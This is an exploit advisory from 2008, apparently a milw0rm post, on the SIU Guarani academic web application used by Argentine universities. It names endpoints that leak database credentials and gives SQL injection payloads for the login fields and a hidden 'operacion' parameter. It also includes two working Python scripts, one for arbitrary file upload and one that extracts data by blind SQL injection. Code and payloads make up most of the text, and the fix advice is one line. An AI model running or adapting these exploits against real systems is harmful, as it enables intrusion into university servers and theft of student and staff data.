<html><head><title>SIU Guarani Multiple Remote Vulnerabilities</title></head><pre>        #
    #   #   #
    ### # ##
      #####             multiple remote vulnerabilities
  ############              siu guarani
     ######
    ##  #  ##
        #


general information
-------------------
bug type	: multiple remote vulnerabilities

software name	: SIU Guarani

vendor		: SIU (www.siu.edu.ar)

authors		: proudhon &amp; Ubik

date		: the 341st day of the year 2008

contact		: N/A

description	: SIU-Guarani is a web application which keeps information about academic activities. It's widely used in Argentina by national 
universities. for more information, contact the vendor's web page.

disclaimer
---------
all the information and code given in this document is provided &quot;as is&quot;, for educational purposes only. the authors will not be responsible for any 
damage.

technical information
---------------------
disclosure of database information
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
you can get some of the database information, such as user and password, used by Guarani. this bug is almost fixed by the vendor.
http://guarani_server/includes/elegirConexion.php

file upload
^^^^^^^^^^^
given a valid phpsessid, you can upload files to the server. this bug is fixed in some versions.
http://guarani_server/a_docentes/subirArchivo.php

sql injection
^^^^^^^^^^^^^
http://guarani_server/w_inicial.php
OR 
http://guarani_server/inicial.php

Username (Identificacion): ' || (SQL Statement) || '
Password (Clave): **** (anything)

example:
Username (Identificacion): ' || DBINFO('dbhostname') || '	
Password (Clave): **** (anything)

just remember they are using Informix!
sql injection is partialy solved in some places.

in order to fool some protections, such as &quot;[Informix]An illegal character has been found in the statement.&quot;, you can use %27 instead of '.

blind sql injection
^^^^^^^^^^^^^^^^^^^
hidden parameter &quot;operacion&quot; in:

http://guarani_server/a_general/verMensajes.php
http://guarani_server/a_general/autentificarse.php

... and probably more!

example (via POST): http://guarani_server/a_general/verMensajes.php?operacion=op0001' || (case when 10&lt;1 then '1' else '2' end) || '

another example (in autentificarse.php):

operacion=op0001' || (SELECT '1' FROM systables where tabid = 1) || '  
(no error, because it returns a single value)
operacion=op0001' || (SELECT '1' FROM systables where tabid &lt;&gt; 1) || ' 
(error, because there are multiple results)

patchs / work arounds
---------------------
among other things, the function which loads the foreign parameters should check for special characters.
the software itself seems to be pretty buggy, releasing the software code under a license like BSD or GPL would help to improve its security.

proof of concept
----------------
file upload
^^^^^^^^^^^
#!/bin/python
# target : SIU Guarani
# file : 4790
# quote : &quot;el poporembo como una flor&quot;, quintin
# disclaimer : all the information and code given in this document is provided &quot;as is&quot;, for educational purposes only. the authors will not be 
# responsible for any damage.

import pycurl
import StringIO
import sys

if len(sys.argv) &lt; 3:
  print &quot;SIU guarani file upload&quot;
  print &quot;usage : &quot; + sys.argv[0] + &quot; &lt;server&gt; &lt;local file&gt;&quot;
  print &quot;example : &quot; + sys.argv[0] + &quot; someuni.edu.ar/somedir someporn.jpg&quot;
  sys.exit(1)

print &quot;getting phpsessid..&quot;
c = pycurl.Curl()
c.setopt(c.URL, &quot;http://&quot; + sys.argv[1] + &quot;/inicial.php&quot;)
c.setopt(c.COOKIEJAR, &quot;/tmp/guaranicookie&quot;)
c.setopt(c.WRITEFUNCTION, (lambda x : None))
c.perform()
c.close()

print &quot;uploading file..&quot;
r = StringIO.StringIO()
c = pycurl.Curl()
c.setopt(c.POST, 1)
c.setopt(c.URL, &quot;http://&quot; + sys.argv[1] + &quot;/a_docentes/subirArchivo.php&quot;)
c.setopt(c.HTTPPOST, [(&quot;archivo&quot;, (c.FORM_FILE, sys.argv[2]))])
c.setopt(c.COOKIEFILE, &quot;/tmp/guaranicookie&quot;)
c.setopt(c.WRITEFUNCTION, r.write)
c.perform()
r.seek(0)
s = r.read()
r.close()
c.close()
s = (s.split(&quot;'../library/bajarArchivo.php?qs=&quot;))[1]
s = (s.split(&quot;'&quot;))[0]
print &quot;your download link is http://&quot; + sys.argv[1] + &quot;/library/bajarArchivo.php?qs=&quot; + s
print &quot;in order to download the file, first you'll need to join http://&quot; + sys.argv[1] + &quot;/ with your web browser&quot;
# EOF

bind sql injection
^^^^^^^^^^^^^^^^^^
#!/bin/python
# target : SIU Guarani
# file : 4791
# quote : &quot;el poporembo como una flor&quot;, quintin
# disclaimer : all the information and code given in this document is provided &quot;as is&quot;, for educational purposes only. the authors will not be 
# responsible for any damage.

import pycurl
import StringIO
import sys

def dic_sql(s, i, x, y):
  num = &quot;SUBSTRING(&quot; + s  + &quot; FROM &quot; + str(i) + &quot; FOR 1)&quot;
  return &quot;(&quot; + num + &quot; &gt;= '&quot; + chr(x) + &quot;') AND (&quot; + num + &quot; &lt;= '&quot; + chr(y) + &quot;')&quot;

maxsize = 32

if len(sys.argv) &lt; 3:
  print &quot;SIU guarani blind sql execution&quot;
  print &quot;usage : &quot; + sys.argv[0] + &quot; &lt;server&gt; &lt;sql string to match&gt; [maxsize=32]&quot;
  print &quot;example : &quot; + sys.argv[0] + &quot; http://someuni.edu.ar/somedir USER&quot;
  print &quot;remember, it's an informix database&quot;
  print &quot;https support!&quot;
  sys.exit(1)

if len(sys.argv) &gt; 3:
  maxsize = int(sys.argv[3])

print &quot;getting phpsessid..&quot;
c = pycurl.Curl()

if (sys.argv[1][0:5] == &quot;https&quot;):
  c.setopt(c.SSL_VERIFYPEER, 0)
c.setopt(c.URL, sys.argv[1] + &quot;/inicial.php&quot;)
c.setopt(c.COOKIEJAR, &quot;/tmp/guaranicookie&quot;)
c.setopt(c.WRITEFUNCTION, (lambda x : None))
c.perform()
c.close()

print &quot;cracking sql result..&quot;

for l in range(1, maxsize + 1):
  i = 48
  f = 125
  c = pycurl.Curl()
  r = StringIO.StringIO()
  if (sys.argv[1][0:5] == &quot;https&quot;):
    c.setopt(c.SSL_VERIFYPEER, 0)
  c.setopt(c.POST, 1)
  c.setopt(c.URL, sys.argv[1] + &quot;/a_general/verMensajes.php&quot;)
  c.setopt(c.COOKIEFILE, &quot;/tmp/guaranicookie&quot;)
  c.setopt(c.WRITEFUNCTION, r.write)

  while i &lt;&gt; f:
    sql = dic_sql(sys.argv[2], l, i, i+(f-i)/2)
    c.setopt(c.HTTPPOST, [(&quot;operacion&quot;, &quot;gda0011' || case when (&quot; + sql + &quot;) then '1' else '2' end || '&quot;), (&quot;ver&quot;, &quot;T&quot;)])
    c.perform()
    r.seek(0)
    s = r.read()
    r.truncate(0)
    if len(s) == 0:
      print &quot;uhm... looks like a wrong sql string!&quot;
      sys.exit(1)
    if len(s.split(&quot;No hay mensajes.&quot;)) &gt; 1 or len(s.split(&quot;Anuncio&quot;)) &gt; 1:
      f = i + (f - i) / 2
    else:
      i = i + (f - i) / 2 + 1
  r.close()
  c.close()
  if i == 125:
    break
  sys.stdout.write(chr(i))
  sys.stdout.flush()
sys.stdout.write('\n')
# EOF

# milw0rm.com [2008-12-08]</pre></html>